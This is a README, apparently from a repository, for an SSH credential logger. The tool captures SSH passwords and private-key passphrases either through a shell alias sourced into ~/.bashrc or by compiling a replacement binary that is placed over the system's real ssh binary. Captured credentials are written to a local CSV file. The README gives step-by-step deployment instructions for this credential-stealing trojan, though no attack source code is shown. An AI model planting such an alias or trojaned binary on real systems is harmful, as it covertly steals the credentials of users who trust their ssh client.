# SSH Credential Logger
Simple Programs that makes use of ssh alias/replacing ssh binary and sshpass to obtain SSH Credentials
## sshpass Installation
Install **sshpass**
* Debian/Ubuntu
```bash
apt install sshpass
```
* Arch
```bash
pacman -S sshpass
```
* Fedora
```bash
dnf install sshpass
```
* Red Hat Linux
```bash
yum install sshpass
```

## SSH Alias
### Requirements
Language Used = Python3<br />
Modules/Packages used:
* os
* sys
* paramiko
* getpass
<!-- -->
Install the dependencies:
```bash
pip install -r requirements.txt
```
### Activation
Source *activate.sh* and add it in *~/.bashrc* or *~/.zshrc* according to your systems
```bash
source activate.sh
```
### Output
It would save the credentials of SSH Users and Passphrases of SSH Private Key Files in a file named ***credentials***, in format:
```csv
TYPE,HOST,PORT,USER,PASSWORD
TYPE,HOST,PORT,USER,PRIVATE KEY FILE,PRIVATE KEY FILE PASSPHRASE
```

## SSH Binary Replacement
Find ssh binary path on your system
```bash
whereis ssh
```
Make its copy somewhere on your system and paste its path on *ssh.c*'s line 14 in **ssh_path** variable<br />
Provide a file to save credentials on *ssh.c*'s line 15 in **dump_path** variable<br />
Compile the C Program using make
```bash
make
```
It would generate an executable named: ***ssh***<br />
Place this file at the original location of your ssh binary obtained via ```whereis ssh``` command
### Output
It would save the credentials of SSH Users and Passphrases of SSH Private Key Files in a file you provided in **dump_path** variable at line 15 in *ssh.c*, in format:
```csv
TYPE,HOST,PORT,USER,PASSWORD
TYPE,HOST,PORT,USER,PRIVATE KEY FILE,PRIVATE KEY FILE PASSPHRASE
```